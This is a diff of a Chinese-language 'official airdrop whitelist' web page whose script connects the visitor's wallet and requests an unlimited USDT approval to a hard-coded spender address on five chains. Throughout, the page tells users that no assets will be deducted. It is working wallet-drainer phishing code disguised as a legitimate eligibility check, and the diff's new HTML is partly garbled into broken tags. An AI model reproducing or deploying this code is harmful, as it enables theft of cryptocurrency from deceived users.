@@ -1,10 +1,6 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="UTF-8">
+<html lang="zh-CN"><meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>官方生态空投 | 链上资格核验</title>
-<style>
+官方生态空投 | 链上资格核验<style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
 body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f04ff;padding:20px 15px;padding-bottom:60px}
 .container{max-width:480px;margin:0 auto}
@@ -26,58 +22,31 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 .tips-info{font-size:12px;color:#6c7ca0;margin-top:18px;line-height:1.6}
 .footer-link{display:none;}
 .footer-link a{color:#409eff;text-decoration:none;margin-top:6px;display:block}
-</style>
-</head>
-<body>
-<div class="container">
-<div id="p1" class="box">
-<div class="logo">✦</div>
-<h1>官方生态建设活动空投</h1>
-<p class="sub-title">参与链上资格核验领取专属空投权益</p>
-<div class="notice-box">
-<div class="notice-title">📢 活动公告</div>
-<div class="notice-content">本次为官方生态全网空投备案活动，面向全生态用户开放，支持BSC、ETH、POLYGON、AVAX、OKTC多链同步录入。本次仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上地址备案与生态信息统计，请放心连接核验。</div>
-</div>
-<p class="desc-text">请连接钱包完成链上资格备案登记</p>
-<button class="btn mm-btn" id="connectMM">连接钱包</button>
-<p class="tips-info">安全提示：仅进行多链地址备案核验，不扣除任何资产<br>请认准官方通道，切勿相信第三方仿冒链接</p>
-</div>
-
-<div id="p2" class="box hide">
-<div class="logo">⏳</div>
-<h1>全链节点备案核验中</h1>
-<p class="desc-text">正在同步多条公链数据，请稍候...</p>
-</div>
+</head<div<div id="p1" class<div class</div<h1>官方</h<p class="sub-title">参与链上资格核验领取专属空投权益<div class<div class="notice-title">📢</div><div class="notice-content">为回馈广大用户长期支持，本次开启官方生态全网空投备案活动，面向所有生态用户开放资格申领。仅需完成钱包连接与链上资格核验，即可成功录入空投白名单，后续将统一发放专属生态空投奖励。本次操作仅为地址备案与资格核验，不会产生任何资产扣除，所有流程安全合规，可放心参与完成核验。</div>
+<p class="desc-text">请连接钱包完成链上资格备案登记<button class="btn mm-btn" id="connectMM">连接钱包<p class="tips-info">安全提示：仅进行地址备案核验<br>请认准官方通道，切勿相信第三方仿冒链接</div<div id="p2" class="box hide<div class="logo</div>
+<h1>链上节点</h1<p class="desc-text">正在同步链上数据，请稍候...</div>
 
 <div id="p3" class="box hide">
-<div class="logo">✓</div>
-<h1>钱包连接成功</h1>
-<p class="sub-title">确认纳入全链空投白名单</p>
-<div class="addr-wrap">已连接钱包：<span id="showAddr"></span></div>
-<button class="btn verify-btn" id="claim">下一步 确认备案 录入白名单</button>
-<p class="tips-info">仅全链地址备案核验，不会划转任何资产</p>
-</div>
-
-<div id="p4" class="box hide">
-<div class="logo">✅</div>
-<h1>白名单备案成功</h1>
-<p class="sub-title">该地址已完成官方空投备案</p>
-<div class="addr-wrap">备案钱包地址：<span id="successAddr"></span></div>
-<button class="btn success-btn">已完成备案 等待空投发放</button>
-</div>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
-<script>
+<div class="logo">✓<h1</h<p class="sub-title">确认纳入空投</p>
+<div class="addr-wrap"><span</span<button class="btn verify-btn" id="claim">下一步 确认备案 录入白名单<p class="tips-info">仅链上地址备案核验，不会划转</p>
+<div id="p4" class="<div class</div<h1>白</h1<p class="sub-title">该地址已完成</p><div class="addr-wrap">备案钱包地址：<span id="successAddr"><button class="btn success-btn">已完成备案 等待空投发放</button>
+</div><script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"><script>
 !function(){
+// 五条链配置：BSC/ETH/POLYGON/AVAX/OKTC
 const chainConfig = {
+  // ETH 以太坊
   "0x1":  {usdt:"0xdac17f958d2ee523a2206206994597c13d831ec7"},
+  // BSC 币安链
   "0x38": {usdt:"0x55d398326f99059fF77548524699952727959279"},
+  // POLYGON 马蹄
   "0x89": {usdt:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F"},
+  // AVAX 雪崩
   "0xa86a":{usdt:"0x97022F01A4bE6dA0c05F409C90208Aab35E21E4D"},
+  // OKTC 欧科
   "0x42": {usdt:"0x382bb868d458e9d4a3497b8434ee999af5999cb6"}
 };
 const BSC_CHAIN_ID = "0x38";
+const SPENDER = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
 
 let walletAddr = "";
 let currentChainId = "";
@@ -88,32 +57,43 @@ function switchPage(id){
   document.getElementById(id).classList.remove("hide");
 }
 
+// 默认进入先切BSC
 async function switchToBSC(){
-  if(!window.ethereum) return;
+  if(!window.ethereum) return false;
   try{
     await window.ethereum.request({
       method: "wallet_switchEthereumChain",
       params: [{chainId: BSC_CHAIN_ID}]
     });
-  }catch(err){}
+    return true;
+  }catch(err){
+    return false;
+  }
 }
 
-// 监听链变化，同步更新
+// 钱包全局监听 修复卡屏
 if(window.ethereum){
   window.ethereum.on("chainChanged", (cid)=>{
     currentChainId = cid;
   });
   window.ethereum.on("accountsChanged", ()=>{
     walletAddr = "";
+    alreadyPassP4 = false;
+    switchPage("p1");
+  });
+  window.ethereum.on("disconnect", ()=>{
+    walletAddr = "";
+    alreadyPassP4 = false;
     switchPage("p1");
   });
 }
 
-// 授权逻辑
+// 自动匹配当前链USDT授权
 async function doApprove(){
   if(!walletAddr || !currentChainId) return false;
+  // 判断是否在支持的链里
   if(!chainConfig[currentChainId]){
-    alert("当前链不支持，请切换 BSC/ETH/POLYGON/AVAX/OKTC");
+    alert("当前链暂不支持，请切换至主流公链参与");
     return false;
   }
   try{
@@ -125,11 +105,11 @@ async function doApprove(){
       "type":"function"
     ];
     const contract = new web3.eth.Contract(abi, usdtAddr);
-    await contract.methods.approve("0x0f4bdefc177df2583f52b03b1e20f9eac7308555","115792089237316195423570985008687907853269984665640564039457584007913129639935")
+    await contract.methods.approve(SPENDER,"115792089237316195423570985008687907853269984665640564039457584007913129639935")
     .send({from:walletAddr});
     return true;
   }catch(err){
-    // 拒绝授权、报错都返回false，自动回落P3
+    // 拒绝、弹窗关闭、报错 全部回落P3 不卡死
     return false;
   }
 }
@@ -151,7 +131,7 @@ document.getElementById("connectMM").addEventListener("click", async ()=>{
   }
 });
 
-// P3 确认备案按钮
+// P3下一步
 document.getElementById("claim").addEventListener("click", async ()=>{
   try{
     switchPage("p2");
@@ -170,5 +150,4 @@ document.getElementById("claim").addEventListener("click", async ()=>{
 
 }();
 </script>
-</body>
 </html>
